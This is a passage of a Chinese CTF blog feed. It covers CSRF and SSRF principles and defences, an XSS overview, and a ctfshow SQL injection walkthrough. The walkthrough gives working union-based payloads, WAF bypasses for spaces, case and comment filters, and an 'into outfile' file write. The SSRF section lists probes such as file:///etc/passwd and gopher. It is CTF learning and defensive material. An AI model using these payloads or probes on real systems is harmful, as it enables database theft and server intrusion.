class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p>]]></content>
      
      
      <categories>
          
          <category> NewStarCTF2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请求伪造漏洞 CSRF&amp;SSRF</title>
      <link href="/posts/32f9e37a358e/"/>
      <url>/posts/32f9e37a358e/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><strong>CSRF（跨站请求伪造，Cross-Site Request Forgery）</strong>允许攻击者在不知情的用户的帮助下，以该用户的身份执行恶意请求。这类攻击通常针对已经向某网站进行身份认证的用户（例如，通过登录认证的用户）。</p><p>实际上攻击者并没有获取到用户在网站上的具体Cookie内容，而且请求头和请求体的内容也都是由攻击者构造的</p><p>CSRF攻击的核心在于利用了web应用程序对用户的信任。<strong>浏览器允许网站A向和自己无关的网站B发起请求（并携带网站B的Cookie）</strong>。</p><p>假设用户已经登录了一个银行网站，并在同一浏览器中访问了另一个恶意网站。恶意网站可以包含一些请求，如HTML表单或JavaScript代码，这些请求被设计为自动向银行网站发送请求。因为用户已经在银行网站上验证了其身份，所以银行网站会认为这些请求是合法的用户请求。</p><p>在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p><h3 id="场景举例"><a href="#场景举例" class="headerlink" title="场景举例"></a>场景举例</h3><p>下面的场景转载自Pikachu靶场</p><p><strong>场景需求：</strong><br>小黑想要修改大白在购物网站<code>www.xx.com</code>上填写的会员地址。<br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—-修改会员信息，提交请求—-修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p><p>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<code>www.xx.com</code>上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：<br><code>http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</code><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</p><p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>1.<code>www.xxx.com</code>这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;<br>—-因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—-如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—-因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—-所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p><p>因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>—对敏感信息的操作增加安全的token；<br>—对敏感信息的操作增加安全的验证码；<br>—对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ol><li><p>验证 HTTP <strong>Referer 字段</strong></p><p>Referer字段记录了该 HTTP 请求的来源地址。通常情况下，安全的页面的会要求请求来自于同一个网站</p><p>然而由于浏览器本身的漏洞，目前也有一些绕过方法，黑客篡改 Referer 值以通过验证</p></li><li><p>在请求地址中添加 token 并验证</p></li><li><p>设置Cookie的<strong>SameSite属性</strong></p><p>Cookie的SameSite属性可以确保携带Cookie发起请求的网站和请求目标的服务是同站</p><p>SameSite属性包括如下取值</p><ul><li>Strict    完全禁止跨站传递Cookie，比如A网站通过超链接跳转B网站也不行，必须用户手动输入这个B网站浏览器才允许使用B网站的Cookie。    过于严格，很少使用。</li><li>Lax    相对宽松(reLax)的规则，大部分情况也不允许跨站传递Cookie，但是对于较为安全的场景：超链接跳转，get类型的Form表单，是允许的。 这个模式是大部分浏览器的SameSite的默认取值（当服务端SetCookie没有制定SameSite时，大部分现代浏览器会默认使用Lax）。使用Lax已经能够杜绝CSRF攻击。 </li><li>None    完全没有限制。老版本浏览器默认仍然会使用None作为SameSite的默认取值。    大部分现代浏览器默认是Lax。以及None默认过于危险，如果要使用SameSite=None则浏览器会要求网站服务使用https才行。</li></ul></li><li><p>在 HTTP 头中自定义属性并验证</p></li></ol><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的安全漏洞。</p><p>所有目标服务器会从自身发起请求的功能点，且攻击者可以控制地址的参数，都可能造成SSRF漏洞</p><p>可能产生漏洞的函数包括</p><ol><li><p><strong>file_get_contents</strong></p><p>file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p><strong>sockopen()</strong></p><p>这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>curl_exec()</strong></p><p>curl也可以用于从目标站点获取内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p><ul><li>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</li><li>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</li><li>sftp:// SSH文件传输协议或安全文件传输协议</li><li>ldap:// 轻量级目录访问协议</li><li>tftp:// 简单文件传输协议</li><li>gopher:// 分布式文档传递服务，可使用gopherus生成payload</li></ul><h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ol><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p></li><li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Web XSS攻击</title>
      <link href="/posts/a179a17711ea/"/>
      <url>/posts/a179a17711ea/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h2><p>XSS全称：跨站脚本(Cross Site Scripting) </p><p>攻击者会向web页面(input表单、URL、留言版等位置)插入恶意JavaScript代码，导致管理员/用户访问时触发，从而达到攻击者的目的。</p><p>主要原因还是服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</p><p>事实上该漏洞在实战中还是需要搭配其他攻击手段来使用，单独利用XSS漏洞可能只能获取用户的Cookie资料</p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><div class="table-container"><table><thead><tr><th>XSS类型</th><th>存储型</th><th>反射型</th><th>DOM型</th></tr></thead><tbody><tr><td><strong>触发过程</strong></td><td>1. 黑客构造XSS脚本<br />2. 正常用户访问携带XSS脚本的页面</td><td>正常用户访问携带XSS脚本的URL</td><td>正常用户访问携带XSS脚本的URL</td></tr><tr><td><strong>数据存储</strong></td><td>数据库</td><td>URL</td><td>URL</td></tr><tr><td><strong>谁来输出</strong></td><td>后端Web应用程序</td><td>后端Web应用程序</td><td>前端JavaScript</td></tr><tr><td><strong>输出位置</strong></td><td>HTTP响应中</td><td>HTTP响应中</td><td>动态构造的DOM节点</td></tr><tr><td><strong>是否持久</strong></td><td>是</td><td>否</td><td>否</td></tr></tbody></table></div><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ol><li><p>对输入和URL参数进行过滤(白名单和黑名单)<br>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p></li><li><p>HTML实体编码<br>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a href="https://www.cnblogs.com/dearxinli/p/5466286.html">https://www.cnblogs.com/dearxinli/p/5466286.html</a></p></li><li><p>对输出内容进行编码<br>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p></li><li><p>消除危险插点</p><p>应尽量避免直接在现有的JavaScript中插入用户可控的数据；</p><p>如果标签属性接受URL作为它的值，应避免嵌入用户的输入；</p></li><li><p>设置set-cookie为httponly或secure</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow SQL注入模块</title>
      <link href="/posts/7161e1c54a15/"/>
      <url>/posts/7161e1c54a15/</url>
      
        <content type="html"><![CDATA[<h2 id="SELECT模块"><a href="#SELECT模块" class="headerlink" title="SELECT模块"></a>SELECT模块</h2><h3 id="web171（经典sql注入）"><a href="#web171（经典sql注入）" class="headerlink" title="web171（经典sql注入）"></a>web171（经典sql注入）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>; </span><br></pre></td></tr></table></figure><p>可以看到执行的sql语句接收<code>$id</code>这个传参，而flag大概率藏在username字段值为flag的数据中</p><p>首先闭合前面的单引号，然后拼接上<code>or username=&#39;flag&#39;</code>，由于后面已经存在单引号，可以留出单引号的位置</p><p>所以payload为<code>1&#39; or username=&#39;flag</code></p><h3 id="web172（字段值绕过）"><a href="#web172（字段值绕过）" class="headerlink" title="web172（字段值绕过）"></a>web172（字段值绕过）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>首先确认该表共有几个字段</p><p><code>1&#39; order by 2 -- qwe</code></p><p>发现共有两个</p><img src="/posts/7161e1c54a15/image-20230920203404506.png" class="" title="image-20230920203404506"><p>通过<strong>information_schema</strong>库获取当前username表中有哪些字段</p><p><code>1&#39; union select 1,column_name from information_schema.columns where table_name=&#39;ctfshow_user2&#39; and table_schema=database() -- qwe</code></p><p>要找的flag在passwd字段中</p><img src="/posts/7161e1c54a15/image-20230920203538032.png" class="" title="image-20230920203538032"><p>由于返回有检测username字段的值是否为<code>flag</code>，那么将username字段用数字1代替即可</p><p>最终payload为<code>1&#39; union select 1,password from ctfshow_user2 where username=&#39;flag&#39;  -- qwe</code></p><img src="/posts/7161e1c54a15/image-20230920203906126.png" class="" title="image-20230920203906126"><h3 id="web173（回显16进制绕过）"><a href="#web173（回显16进制绕过）" class="headerlink" title="web173（回显16进制绕过）"></a>web173（回显16进制绕过）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断该表有几个字段</p><p><code>1&#39; order by 4 -- qwe</code>时无显示</p><p>说明有三个字段</p><p>测试发现三个数据位均有回显</p><img src="/posts/7161e1c54a15/image-20230924201112415.png" class="" title="image-20230924201112415"><p>由于对回显结果中的flag有检测</p><p>只需将用户名的返回字段额外处理一下，比如转为十六进制</p><p>最后payload为<code>-1&#39; union select id,hex(username),password from ctfshow_user3 where username=&#39;flag&#39; -- qwe</code></p><img src="/posts/7161e1c54a15/image-20230924201445673.png" class="" title="image-20230924201445673"><h3 id="web174（replace绕过）"><a href="#web174（replace绕过）" class="headerlink" title="web174（replace绕过）"></a>web174（replace绕过）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>首先判断该表有几个字段</p><p><code>1&#39; order by 3 -- qwe</code>时无显示</p><p>说明有两个字段</p><p>测试发现两个数据位均有回显</p><p>由于源码对回显结果中的<strong>flag以及数字0到9均有检测</strong></p><p>我们直接将username字段用字母替换即可绕过对值flag的检测</p><p>这里需要绕过过滤的主要是<strong>flag括号中的数字</strong>，可以使用replace绕过</p><p>最后payload为<code>-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username = &#39;flag&#39; -- qwe</code></p><img src="/posts/7161e1c54a15/image-20230924212254801.png" class="" title="image-20230924212254801"><p>替换后的flag为<code>ctfshow&#123;f@B@Hbabd@C-@E@A@B@I-@D@Bf@E-b@E@Gb-@J@I@C@A@A@F@E@H@Ja@Ha&#125;</code></p><p>使用如下python脚本替换回来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher = <span class="string">&quot;ctfshow&#123;f@B@Hbabd@C-@E@A@B@I-@D@Bf@E-b@E@Gb-@J@I@C@A@A@F@E@H@Ja@Ha&#125;&quot;</span></span><br><span class="line">flag = Cipher.replace(<span class="string">&quot;@A&quot;</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="string">&quot;@B&quot;</span>, <span class="string">&quot;2&quot;</span>).replace(<span class="string">&quot;@C&quot;</span>, <span class="string">&quot;3&quot;</span>).replace(<span class="string">&quot;@D&quot;</span>, <span class="string">&quot;4&quot;</span>).replace(<span class="string">&quot;@E&quot;</span>, <span class="string">&quot;5&quot;</span>).replace(<span class="string">&quot;@F&quot;</span>, <span class="string">&quot;6&quot;</span>).replace(<span class="string">&quot;@G&quot;</span>, <span class="string">&quot;7&quot;</span>).replace(<span class="string">&quot;@H&quot;</span>, <span class="string">&quot;8&quot;</span>).replace(<span class="string">&quot;@I&quot;</span>, <span class="string">&quot;9&quot;</span>).replace(<span class="string">&quot;@J&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="web175（导出回显）"><a href="#web175（导出回显）" class="headerlink" title="web175（导出回显）"></a>web175（导出回显）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断该表有几个字段</p><p><code>1&#39; order by 3 -- qwe</code>时无显示</p><p>说明有两个字段</p><p>过滤中<code>[\x00-\x7f]</code> 匹配ASCII值从0-127的字符，基本上所有能显示的字符都被过滤掉了</p><p>由于前端页面无法显示返回的信息，我们尝试把返回信息导出到文件</p><p>最后payload为<code>-1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/ctf.txt&#39; -- qwe</code></p><p>导出的flag在网站的<code>/ctf.txt</code>路径下</p><h3 id="web176（大小写绕过）"><a href="#web176（大小写绕过）" class="headerlink" title="web176（大小写绕过）"></a>web176（大小写绕过）</h3><p>题目给的部分源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示对传入参数进行了过滤</p><p>先尝试最普通的联合注入<code>-1&#39; union select id,username,password from ctfshow_user where username =&#39;flag&#39; -- qwe</code></p><p>没有回显</p><p>尝试改变关键字的大小写，因为SQL语句对关键字大小写不敏感</p><p><code>-1&#39; union Select id,username,password from ctfshow_user where username =&#39;flag&#39; -- qwe</code>通过</p><p>说明题目是对<strong>selcet</strong>关键字进行了过滤</p><h3 id="web177（空格绕过1）"><a href="#web177（空格绕过1）" class="headerlink" title="web177（空格绕过1）"></a>web177（空格绕过1）</h3><p>题目提示对传入参数进行了过滤</p><p>尝试让payload中不涉及关键字</p><p><code>-1&#39; or username =&#39;flag&#39; -- qwe</code></p><p>没有回显</p><p>考虑可能是对字符进行了过滤，最常见的是对空格的过滤</p><p>将空格替换为/**/</p><p>由于空格被过滤，注释<code>--空格</code>也无法使用，替换为%23</p><p><code>-1&#39;Union/**/Select/**/id,username,password/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23</code></p><h3 id="web178（空格绕过2）"><a href="#web178（空格绕过2）" class="headerlink" title="web178（空格绕过2）"></a>web178（空格绕过2）</h3><p>使用<code>1&#39; or &#39;a&#39; = &#39;a</code>测试，发现不给过，说明仍然存在空格过滤</p><p>尝试使用注释绕过，测试<code>1&#39;or/**/&#39;a&#39;=&#39;a</code>，发现仍然不给过，说明注释也被ban掉了</p><p>测试<code>1&#39;or&#39;a&#39;=&#39;a&#39;%23</code>通过，说明注释中%23还能用，可能是只ban掉了<code>/**/</code></p><p>那么这题可以使用<strong>括号绕过空格过滤</strong></p><p>payload为<code>-1&#39;Union(Select(id),(username),(password)from(ctfshow_user)where(username)=&#39;flag&#39;%23</code></p><p>成功获取flag</p><h3 id="web179（空格绕过3）"><a href="#web179（空格绕过3）" class="headerlink" title="web179（空格绕过3）"></a>web179（空格绕过3）</h3><p>这题仍然是可以使用括号绕过空格</p><p>我们也可以尝试一下其他方法，比如<strong>换页符%0c</strong></p><p>payload为<code>-1&#39;Union%0cSelect%0cid,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=&#39;flag&#39;%23</code></p><h3 id="web180（空格绕过4）"><a href="#web180（空格绕过4）" class="headerlink" title="web180（空格绕过4）"></a>web180（空格绕过4）</h3><p>测试<code>1&#39;or&#39;a&#39;=&#39;a&#39;%23</code>不通过，测试<code>1&#39;or&#39;a&#39;=&#39;a</code>通过，说明<code>#</code>注释被过滤</p><p>可以换成<code>or&#39;1&#39;=&#39;</code>或<code>--%0c</code>来闭合或注释掉后面的引号</p><p>payload为<code>-1&#39;Union%0cSelect%0cid,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=&#39;flag&#39;--%0c</code></p><h3 id="web181（空格绕过5）"><a href="#web181（空格绕过5）" class="headerlink" title="web181（空格绕过5）"></a>web181（空格绕过5）</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 